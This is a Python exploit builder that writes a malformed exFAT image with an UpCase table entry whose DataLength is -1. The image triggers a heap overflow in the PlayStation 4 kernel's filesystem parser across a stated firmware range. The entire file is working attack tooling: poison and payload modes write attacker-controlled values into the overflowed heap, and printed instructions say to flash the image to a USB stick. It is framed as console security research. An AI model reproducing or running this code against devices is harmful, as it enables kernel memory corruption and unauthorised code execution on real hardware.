#!/usr/bin/env python3
"""
build_exfathax_v2_image.py — exFAThax v2 image builder for PS4 13.04

Builds a malformed exFAT image that triggers the UVFAT_readupcasetable
integer overflow heap overflow (CVE-2022-3349 lineage, v2 variant).

Bug: DataLength=-1 + blsize=0x200 → malloc(0) → heap overflow
Target: PS4 FW 9.03 – 13.50 (patched in 13.50)

Based on: CelesteBlue PoC (2026-06-25) and H4SS9M's exploit plan.

Usage:
    python3 build_exfathax_v2_image.py -o exfathax.img
    python3 build_exfathax_v2_image.py -o exfathax.img --survey
    python3 build_exfathax_v2_image.py -o exfathax.img -n 32 --poison-offset 16 --poison 0x4141414141414141

Then: dd if=exfathax.img of=/dev/sdX (USB stick)
"""

import struct
import argparse
import os

# ============================================================
# exFAT constants
# ============================================================
SECTOR_SIZE = 512       # BytesPerSector = 0x200
CLUSTER_SIZE = SECTOR_SIZE  # SectorsPerCluster = 1
FAT_OFFSET = 0x1000     # FAT starts at sector 8
CLUSTER_HEAP_OFFSET = 0x2000  # Data region starts at sector 16
ROOT_DIR_CLUSTER = 2     # Root directory at cluster 2
UPCASE_CLUSTER = 4       # UpCase table starts at cluster 4
BITMAP_CLUSTER = 3       # Allocation bitmap at cluster 3

# exFAT entry types
ENTRY_BITMAP = 0x81
ENTRY_UPCASE = 0x82
ENTRY_LABEL = 0x83
ENTRY_FILE = 0x85
ENTRY_STREAM = 0xC0
ENTRY_FILENAME = 0xC1

def build_boot_sector():
    """Build exFAT boot sector (VBR)"""
    sector = bytearray(SECTOR_SIZE)
    
    # Jump boot code
    sector[0:3] = b'\xEB\x76\x90'
    
    # FileSystemName
    sector[3:11] = b'EXFAT   '
    
    # MustBeZero (BPB area)
    # sector[11:64] already zero
    
    # PartitionOffset (0 for removable)
    struct.pack_into('<Q', sector, 64, 0)
    
    # VolumeLength (in sectors) - 32MB image
    volume_sectors = 65536  # 32MB / 512
    struct.pack_into('<Q', sector, 72, volume_sectors)
    
    # FatOffset (in sectors from partition start)
    struct.pack_into('<I', sector, 80, FAT_OFFSET // SECTOR_SIZE)
    
    # FatLength (in sectors)
    struct.pack_into('<I', sector, 84, 0x1000 // SECTOR_SIZE)
    
    # ClusterHeapOffset (in sectors)
    struct.pack_into('<I', sector, 88, CLUSTER_HEAP_OFFSET // SECTOR_SIZE)
    
    # ClusterCount
    cluster_count = (volume_sectors * SECTOR_SIZE - CLUSTER_HEAP_OFFSET) // CLUSTER_SIZE
    struct.pack_into('<I', sector, 92, cluster_count)
    
    # FirstClusterOfRootDirectory
    struct.pack_into('<I', sector, 96, ROOT_DIR_CLUSTER)
    
    # VolumeSerialNumber
    struct.pack_into('<I', sector, 100, 0xDEAD1304)
    
    # FileSystemRevision (1.00)
    struct.pack_into('<H', sector, 104, 0x0100)
    
    # VolumeFlags
    struct.pack_into('<H', sector, 106, 0x0000)
    
    # BytesPerSectorShift (9 = 2^9 = 512)
    sector[108] = 9
    
    # SectorsPerClusterShift (0 = 2^0 = 1)
    sector[109] = 0
    
    # NumberOfFats
    sector[110] = 1
    
    # DriveSelect (0x80 for HDD)
    sector[111] = 0x80
    
    # PercentInUse (0xFF = unknown)
    sector[112] = 0xFF
    
    # Boot signature
    sector[510] = 0x55
    sector[511] = 0xAA
    
    # Calculate and set boot checksum
    return bytes(sector)

def build_fat(num_upcase_clusters):
    """Build FAT with chain for upcase table"""
    fat = bytearray(0x1000)  # 4KB FAT
    
    # Cluster 0 and 1 are reserved
    struct.pack_into('<I', fat, 0, 0xFFFFFFF8)  # Media descriptor
    struct.pack_into('<I', fat, 4, 0xFFFFFFFF)  # Reserved
    
    # Cluster 2 = Root directory (single cluster, EOC)
    struct.pack_into('<I', fat, 8, 0xFFFFFFFF)
    
    # Cluster 3 = Allocation bitmap (single cluster, EOC)
    struct.pack_into('<I', fat, 12, 0xFFFFFFFF)
    
    # Clusters 4..4+N-1 = UpCase table chain
    for i in range(num_upcase_clusters - 1):
        cluster = UPCASE_CLUSTER + i
        next_cluster = cluster + 1
        struct.pack_into('<I', fat, cluster * 4, next_cluster)
    
    # Last cluster in chain = EOC
    last_cluster = UPCASE_CLUSTER + num_upcase_clusters - 1
    struct.pack_into('<I', fat, last_cluster * 4, 0xFFFFFFFF)
    
    return bytes(fat)

def build_root_directory(num_upcase_clusters, data_length):
    """Build root directory with malicious UpCase table entry"""
    root = bytearray(CLUSTER_SIZE)
    offset = 0
    
    # Entry 1: Volume Label (optional but helps)
    root[offset] = ENTRY_LABEL
    root[offset + 1] = 4  # CharacterCount
    label = 'HACK'.encode('utf-16-le')
    root[offset + 2:offset + 2 + len(label)] = label
    offset += 32
    
    # Entry 2: Allocation Bitmap
    root[offset] = ENTRY_BITMAP
    root[offset + 1] = 0  # BitmapFlags (first bitmap)
    struct.pack_into('<I', root, offset + 20, BITMAP_CLUSTER)  # FirstCluster
    struct.pack_into('<Q', root, offset + 24, CLUSTER_SIZE)    # DataLength
    offset += 32
    
    # Entry 3: UpCase Table (MALICIOUS)
    root[offset] = ENTRY_UPCASE
    # +0x00: EntryType = 0x82
    # +0x04: TableChecksum (u32) - we use 0 for now
    struct.pack_into('<I', root, offset + 4, 0x00000000)
    # +0x14: FirstCluster (u32)
    struct.pack_into('<I', root, offset + 20, UPCASE_CLUSTER)
    # +0x18: DataLength (u64) = 0xFFFFFFFFFFFFFFFF (-1) = THE BUG
    struct.pack_into('<Q', root, offset + 24, data_length)
    offset += 32
    
    return bytes(root)

def build_bitmap():
    """Build minimal allocation bitmap"""
    bitmap = bytearray(CLUSTER_SIZE)
    # Mark clusters 2-67 as used (bits 0-65)
    for i in range(9):
        bitmap[i] = 0xFF
    return bytes(bitmap)

def build_upcase_data(num_chunks, payload=None, survey=False, poison_pairs=None):
    """Build UpCase table data (the overflow content)
    
    Chunk 0: bytes 0x00-0xFF = identity map (required), 0x100-0x1FF = free
    Chunks 1+: fully controllable
    """
    data = bytearray(num_chunks * SECTOR_SIZE)
    
    # Chunk 0: identity upcase table (REQUIRED)
    # First 256 entries (512 bytes as uint16) must be identity a-z -> A-Z
    for i in range(256):
        val = i
        # Convert lowercase to uppercase
        if 0x61 <= i <= 0x7A:  # a-z
            val = i - 0x20     # A-Z
        struct.pack_into('<H', data, i * 2, val)
    
    # Free region starts at byte 0x200 (chunk 1) for full chunks
    # and byte 0x100 of chunk 0 for the second half
    
    if survey:
        # Survey mode: write distinct marker per 16-byte item
        # Item i at offset i*16
        for i in range(16, len(data) // 16):  # Skip first 16 items (identity)
            offset = i * 16
            # Write item index as 8-byte marker
            struct.pack_into('<Q', data, offset, i)
            # Write 0xDEADDEAD as second qword (recognizable)
            struct.pack_into('<Q', data, offset + 8, 0xDEADDEAD00000000 | i)
    
    elif poison_pairs:
        # Poison mode: write specific values at specific item offsets
        for item_offset, value in poison_pairs:
            if item_offset < 16:
                print(f"WARNING: Cannot poison item {item_offset} (in identity region)")
                continue
            byte_offset = item_offset * 16
            if byte_offset + 8 <= len(data):
                struct.pack_into('<Q', data, byte_offset, value)
                print(f"Poisoned item {item_offset} (offset 0x{byte_offset:x}) = 0x{value:016x}")
    
    elif payload:
        # Custom payload starting at byte 0x100 of chunk 0
        payload_start = 0x100
        payload_len = min(len(payload), len(data) - payload_start)
        data[payload_start:payload_start + payload_len] = payload[:payload_len]
    
    return bytes(data)

def build_image(args):
    """Build the complete exFAT image"""
    
    num_chunks = args.chunks
    data_length = args.data_length
    
    print(f"=== exFAThax v2 Image Builder ===")
    print(f"Chunks (FAT chain): {num_chunks}")
    print(f"DataLength: 0x{data_length:016X}")
    print(f"Sector size: {SECTOR_SIZE}")
    print(f"Overflow size: {num_chunks * SECTOR_SIZE} bytes")
    print()
    
    # Parse poison pairs
    poison_pairs = []
    if args.poison_offset and args.poison:
        for off, val in zip(args.poison_offset, args.poison):
            poison_pairs.append((off, int(val, 16) if isinstance(val, str) else val))
    
    # Load custom payload
    payload = None
    if args.payload:
        with open(args.payload, 'rb') as f:
            payload = f.read()
        print(f"Custom payload: {len(payload)} bytes from {args.payload}")
    
    # Build components
    boot = build_boot_sector()
    fat = build_fat(num_chunks)
    root_dir = build_root_directory(num_chunks, data_length)
    bitmap = build_bitmap()
    
    if args.benign:
        print("BENIGN MODE: Normal upcase table (no overflow)")
        upcase = build_upcase_data(num_chunks)
    elif args.survey:
        print("SURVEY MODE: Marker ramp per 16-byte item")
        upcase = build_upcase_data(num_chunks, survey=True)
    elif poison_pairs:
        print(f"POISON MODE: {len(poison_pairs)} poison pairs")
        upcase = build_upcase_data(num_chunks, poison_pairs=poison_pairs)
    elif payload:
        print("PAYLOAD MODE: Custom payload")
        upcase = build_upcase_data(num_chunks, payload=payload)
    else:
        print("DEFAULT MODE: Zeros in free region")
        upcase = build_upcase_data(num_chunks)
    
    # Assemble image
    image = bytearray(32 * 1024 * 1024)  # 32MB image
    
    # Boot sector at offset 0
    image[0:SECTOR_SIZE] = boot
    
    # Backup boot sector at sector 12
    image[12 * SECTOR_SIZE:13 * SECTOR_SIZE] = boot
    
    # FAT at FAT_OFFSET
    image[FAT_OFFSET:FAT_OFFSET + len(fat)] = fat
    
    # Cluster heap starts at CLUSTER_HEAP_OFFSET
    # Cluster 2 = root directory
    root_offset = CLUSTER_HEAP_OFFSET + (ROOT_DIR_CLUSTER - 2) * CLUSTER_SIZE
    image[root_offset:root_offset + len(root_dir)] = root_dir
    
    # Cluster 3 = bitmap
    bitmap_offset = CLUSTER_HEAP_OFFSET + (BITMAP_CLUSTER - 2) * CLUSTER_SIZE
    image[bitmap_offset:bitmap_offset + len(bitmap)] = bitmap
    
    # Cluster 4+ = upcase table data
    upcase_offset = CLUSTER_HEAP_OFFSET + (UPCASE_CLUSTER - 2) * CLUSTER_SIZE
    image[upcase_offset:upcase_offset + len(upcase)] = upcase
    
    # Write output
    output = bytes(image)
    with open(args.output, 'wb') as f:
        f.write(output)
    
    print()
    print(f"Image written: {args.output} ({len(output)} bytes)")
    print()
    print("=== Layout ===")
    print(f"  Boot sector:  0x{0:08x}")
    print(f"  FAT:          0x{FAT_OFFSET:08x}")
    print(f"  Root dir:     0x{root_offset:08x} (cluster {ROOT_DIR_CLUSTER})")
    print(f"  Bitmap:       0x{bitmap_offset:08x} (cluster {BITMAP_CLUSTER})")
    print(f"  UpCase data:  0x{upcase_offset:08x} (cluster {UPCASE_CLUSTER}, {num_chunks} chunks)")
    print()
    print("=== UpCase Entry (MALICIOUS) ===")
    print(f"  EntryType:    0x82")
    print(f"  FirstCluster: {UPCASE_CLUSTER}")
    print(f"  DataLength:   0x{data_length:016X} (-1)")
    print()
    
    if not args.benign:
        print("=== DANGER ===")
        print("This image WILL cause a kernel panic on PS4 FW 9.03-13.50!")
        print("Use only on YOUR OWN console for security research.")
        print()
        print("To flash: dd if={} of=/dev/sdX bs=4M".format(args.output))
    
    if args.verbose:
        print()
        print("=== Hex dump of UpCase entry ===")
        entry_offset = root_offset + 64  # Third entry (after label + bitmap)
        entry = image[entry_offset:entry_offset + 32]
        for i in range(0, 32, 16):
            hex_str = ' '.join(f'{b:02x}' for b in entry[i:i+16])
            print(f"  {hex_str}")

def main():
    parser = argparse.ArgumentParser(
        description='exFAThax v2 image builder for PS4 13.04 security research')
    
    parser.add_argument('-o', '--output', default='exfathax_v2.img',
                       help='Output image filename (default: exfathax_v2.img)')
    parser.add_argument('-n', '--chunks', type=int, default=32,
                       help='FAT chain length in clusters (default: 32, each = 512 bytes)')
    parser.add_argument('-s', '--data-length', type=lambda x: int(x, 0),
                       default=0xFFFFFFFFFFFFFFFF,
                       help='DataLength value (default: -1 / 0xFFFFFFFFFFFFFFFF)')
    parser.add_argument('-p', '--payload', type=str, default=None,
                       help='Custom payload file for free region')
    parser.add_argument('--poison-offset', type=int, action='append',
                       help='Item offset to poison (16-byte items, >= 16)')
    parser.add_argument('--poison', type=str, action='append',
                       help='64-bit hex value for poison (e.g., 0x4141414141414141)')
    parser.add_argument('--survey', action='store_true',
                       help='Survey mode: marker ramp for heap measurement')
    parser.add_argument('-b', '--benign', action='store_true',
                       help='Benign mode: valid upcase table (no overflow)')
    parser.add_argument('-v', '--verbose', action='store_true',
                       help='Verbose output with hex dumps')
    
    args = parser.parse_args()
    build_image(args)

if __name__ == '__main__':
    main()
